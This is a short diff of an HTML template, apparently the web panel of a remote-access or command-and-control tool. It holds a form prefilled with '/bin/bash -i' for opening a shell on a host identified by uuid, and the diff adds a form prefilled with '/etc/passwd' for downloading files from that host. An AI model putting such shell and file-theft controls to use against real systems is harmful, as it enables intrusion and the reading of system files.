@@ -22,6 +22,10 @@
             <input type="text" name="command" value="/bin/bash -i">
             <input type="submit" value="Shell">
         </form>
+        <form method="GET" action="{{ url_for("download_file", uuid=uuid) }}">
+            <input type="text" name="file" value="/etc/passwd">
+            <input type="submit" value="Download">
+        </form>
     </div>
 {% endfor %}
 
